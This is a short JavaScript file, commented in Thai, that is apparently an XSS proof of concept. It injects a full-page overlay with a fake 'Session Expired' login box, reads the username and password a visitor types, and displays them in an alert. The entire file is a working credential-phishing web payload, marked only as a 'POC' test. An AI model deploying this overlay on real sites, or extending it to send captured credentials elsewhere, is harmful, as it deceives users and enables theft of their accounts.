function hello() {
    // 1. สร้าง Overlay (ฉากหลังเทา)
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
    overlay.style.zIndex = '9999';
    overlay.style.display = 'flex';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    overlay.style.fontFamily = 'Arial, sans-serif';

    // 2. สร้างกล่อง Modal (หน้า Login)
    const modal = document.createElement('div');
    modal.style.backgroundColor = 'white';
    modal.style.padding = '30px';
    modal.style.borderRadius = '8px';
    modal.style.boxShadow = '0 4px 15px rgba(0,0,0,0.3)';
    modal.style.textAlign = 'center';
    modal.style.width = '350px';
    modal.style.color = 'black'; // มั่นใจว่าตัวอักษรไม่กลืนกับพื้นหลัง

    modal.innerHTML = `
        <h2 style="color: #d9534f; margin-top: 0;">⚠️ Security Alert</h2>
        <p>Session Expired. Please login again to continue.</p>
        <p style="font-weight: bold; color: blue;">(POC: ทดสอบ Phishing)</p>
        <input type="text" id="username" placeholder="Username" style="width: 90%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;">
        <input type="password" id="password" placeholder="Password" style="width: 90%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px;">
        <br>
        <button id="loginBtn" style="width: 95%; padding: 10px; background-color: #0275d8; color: white; border: none; border-radius: 4px; cursor: pointer;">Login</button>
    `;

    // --- จุดสำคัญที่หายไป ---
    overlay.appendChild(modal); 
    // ----------------------

    // ฟังก์ชันช่วยจัดการเมื่อกดปุ่ม (Optional)
    const runPayload = () => {
        document.body.appendChild(overlay);
        document.getElementById('loginBtn').onclick = function() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            alert('POC Captured!\nUser: ' + user + '\nPass: ' + pass);
            overlay.remove(); // ปิดหน้าต่างหลังกด
        };
    };

    if (document.body) {
        runPayload();
    } else {
        window.addEventListener('DOMContentLoaded', runPayload);
    }
}
